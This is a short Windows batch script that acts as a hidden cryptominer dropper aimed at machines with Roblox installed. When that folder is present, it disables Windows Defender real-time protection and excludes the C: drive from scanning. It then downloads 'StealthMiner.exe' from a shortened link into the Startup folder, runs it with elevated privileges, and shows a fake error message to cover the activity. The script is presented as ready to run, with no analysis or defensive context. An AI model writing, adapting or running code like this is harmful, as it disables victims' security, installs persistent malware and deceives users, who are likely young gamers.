@echo off
set "roblox_folder=%localappdata%\Roblox"
set "miner_exe=%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\StealthMiner.exe"

IF EXIST "%roblox_folder%" (
    powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
    powershell -Command "Add-MpPreference -ExclusionPath 'C:\'"

    powershell -Command "Invoke-WebRequest -Uri 'https://bit.ly/MINERZS' -OutFile '%miner_exe%'"
    powershell -Command "Start-Process '%miner_exe%' -Verb RunAs"
    echo ERROR: 301
)

exit
